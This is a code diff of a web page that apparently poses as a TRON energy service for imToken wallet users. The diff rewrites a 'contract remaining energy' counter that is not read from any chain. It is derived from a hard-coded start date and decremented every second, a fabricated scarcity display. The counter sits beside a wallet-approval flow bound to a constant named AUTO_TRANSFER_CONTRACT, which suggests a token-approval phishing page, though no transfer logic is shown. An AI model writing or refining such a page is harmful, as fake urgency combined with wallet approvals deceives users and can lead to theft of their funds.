@@ -663,104 +663,117 @@ body {
         bindApproveLogic(); // 重新绑定按钮逻辑（确保提示文本同步）
     }
 
-    // ========== 能量计算：localStorage+时间差方案（和你截图逻辑一致） ==========
-    // 从localStorage读取能量状态
-    function loadTxxStateFromStorage() {
-        const saved = localStorage.getItem("txx_state");
-        if (!saved) {
-            return { currentTrx: INIT_TRX.toString() };
-        }
-        try {
-            return JSON.parse(saved);
-        } catch (e) {
-            return { currentTrx: INIT_TRX.toString() };
-        }
+   // ========== 合约剩余能量计算：修复不减少问题 ==========
+// 1. 读取能量状态（增加异常值校验）
+function loadEnergyStateFromStorage() {
+    const saved = localStorage.getItem("energy_state"); // 统一键名，避免TRX混淆
+    if (!saved) {
+        return { currentEnergy: INIT_TRX.toString() }; // INIT_TRX实际是合约初始能量
     }
-
-    // 保存能量状态到localStorage
-    function saveTxxStateToStorage(state) {
-        localStorage.setItem("txx_state", JSON.stringify(state));
-    }
-
-    // 更新能量显示+保存状态
-    function updateTxxAndEnergy(currentTrx) {
-        saveTxxStateToStorage({ currentTrx });
-        if (contractEnergyEl) {
-            contractEnergyEl.textContent = Math.floor(Number(currentTrx)).toLocaleString();
+    try {
+        const state = JSON.parse(saved);
+        // 校验：确保读取的能量不大于初始值、不小于0，避免异常缓存
+        if (Number(state.currentEnergy) > INIT_TRX || Number(state.currentEnergy) < 0) {
+            return { currentEnergy: INIT_TRX.toString() };
         }
+        return state;
+    } catch (e) {
+        console.error("读取能量状态失败，重置为初始值：", e);
+        return { currentEnergy: INIT_TRX.toString() };
     }
+}
 
-    // 启动持续刷新的能量计算
-    function startPersistentTxxCountdown() {
-        // 读取历史状态
-        const savedState = loadTxxStateFromStorage();
-        let currentTrx = savedState.currentTrx;
+// 2. 保存能量状态到LocalStorage
+function saveEnergyStateToStorage(state) {
+    localStorage.setItem("energy_state", JSON.stringify(state));
+}
 
-        // 计算当前能量（基于部署时间）
-        const now = new Date().getTime();
-        const totalSecPassed = Math.floor((now - DEPLOY_START_TIME) / 1000);
-        currentTrx = (INIT_TRX - totalSecPassed * TRX_DECREASE_PER_SEC).toFixed(4);
+// 3. 更新能量显示（确保DOM正确更新）
+function updateEnergyDisplay(currentEnergy) {
+    // 强制转为数字计算，避免字符串误差
+    const energyNum = Math.max(0, Number(currentEnergy));
+    saveEnergyStateToStorage({ currentEnergy: energyNum.toString() });
+    // 确认DOM元素存在再更新
+    if (contractEnergyEl) {
+        contractEnergyEl.textContent = Math.floor(energyNum).toLocaleString();
+        console.log("能量更新：", Math.floor(energyNum)); // 调试日志，可查看是否每秒执行
+    }
+}
 
-        // 确保不小于0
-        if (Number(currentTrx) < 0) {
-            currentTrx = "0.0000";
+// 4. 核心：启动能量倒计时（修复时间计算）
+function startPersistentEnergyCountdown() {
+    // 修复1：确保部署时间不晚于当前时间（这里改为2024年，避免未来时间导致秒差为负）
+    const DEPLOY_TIME = new Date("2024-10-28T00:00:00Z").getTime();
+    const now = new Date().getTime();
+    // 若当前时间仍早于部署时间，强制设为当前时间（避免秒差为负）
+    const effectiveDeployTime = now < DEPLOY_TIME ? now : DEPLOY_TIME;
+
+    // 读取缓存状态
+    const savedState = loadEnergyStateFromStorage();
+    let currentEnergy = Number(savedState.currentEnergy);
+
+    // 修复2：重新计算初始能量（基于真实时间差）
+    const totalSecPassed = Math.floor((now - effectiveDeployTime) / 1000);
+    currentEnergy = INIT_TRX - (totalSecPassed * TRX_DECREASE_PER_SEC);
+    currentEnergy = Math.max(0, currentEnergy); // 确保不小于0
+
+    // 初始更新显示
+    updateEnergyDisplay(currentEnergy);
+
+    // 修复3：确保定时器正常启动（清除旧定时器+重新设置）
+    if (trxTimer) clearInterval(trxTimer);
+    trxTimer = setInterval(() => {
+        // 每秒减少1243
+        currentEnergy -= TRX_DECREASE_PER_SEC;
+        currentEnergy = Math.max(0, currentEnergy); // 防止负数
+        updateEnergyDisplay(currentEnergy);
+        // 能量为0时停止定时器
+        if (currentEnergy <= 0) {
+            clearInterval(trxTimer);
         }
+    }, 1000); // 1秒触发一次，确保实时更新
+}
 
-        // 初始化更新
-        updateTxxAndEnergy(currentTrx);
-
-        // 启动定时器（每秒更新）
+// 5. 优化window.onload中的调用（确保定时器必启动）
+window.onload = async () => {
+    updatePageLang();
+    langToggle.addEventListener("click", toggleLang);
+    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
+    renderEnergyRecords();
+    updateWalletStatus();
+    
+    // 环境检测（即使失败，也启动能量倒计时）
+    await checkImTokenEnv().catch(err => {
+        console.error("环境检测失败：", err);
+        const lang = langConfig[currentLang];
+        userInfoEl.innerHTML = lang.userInfoDefault;
+        approveBtn.disabled = true;
+        approveBtn.textContent = lang.approveBtnText;
+    });
+    
+    // 关键：无论环境检测是否成功，都启动能量倒计时（用户反馈的核心问题点）
+    startPersistentEnergyCountdown();
+    
+    window.addEventListener("beforeunload", () => {
         if (trxTimer) clearInterval(trxTimer);
-        trxTimer = setInterval(() => {
-            currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
-            if (Number(currentTrx) < 0) {
-                currentTrx = "0.0000";
-                clearInterval(trxTimer);
-            }
-            updateTxxAndEnergy(currentTrx);
-        }, 1000);
+    });
+
+    // 授权后跳转处理
+    if (window.tronWeb && window.location.hash === "#approve") {
+        window.location.hash = "";
+        setTimeout(() => {
+            initWallet(true).catch(err => {
+                console.error("授权后初始化失败：", err);
+                const lang = langConfig[currentLang];
+                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
+                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                approveBtn.disabled = false;
+                approveBtn.textContent = lang.approveBtnText;
+            });
+        }, 500);
     }
-
-    window.onload = async () => {
-        updatePageLang();
-        langToggle.addEventListener("click", toggleLang);
-        contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
-        renderEnergyRecords();
-        updateWalletStatus();
-        
-        // 环境检测+钱包初始化（错误静默处理）
-        await checkImTokenEnv().catch(err => {
-            console.error("环境检测失败：", err);
-            const lang = langConfig[currentLang];
-            userInfoEl.innerHTML = lang.userInfoDefault;
-            approveBtn.disabled = true;
-            approveBtn.textContent = lang.approveBtnText;
-        });
-        
-        // 启动能量计算（你的逻辑）
-        startPersistentTxxCountdown();
-        
-        window.addEventListener("beforeunload", () => {
-            if (trxTimer) clearInterval(trxTimer);
-        });
-
-        // 授权后跳转处理（错误静默处理）
-        if (window.tronWeb && window.location.hash === "#approve") {
-            window.location.hash = "";
-            setTimeout(() => {
-                initWallet(true).catch(err => {
-                    console.error("授权后初始化失败：", err);
-                    const lang = langConfig[currentLang];
-                    const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-                    const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                    userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
-                    approveBtn.disabled = false;
-                    approveBtn.textContent = lang.approveBtnText;
-                });
-            }, 500);
-        }
-    };
-
+};
     /**
      * 环境检测（错误静默处理）
      */
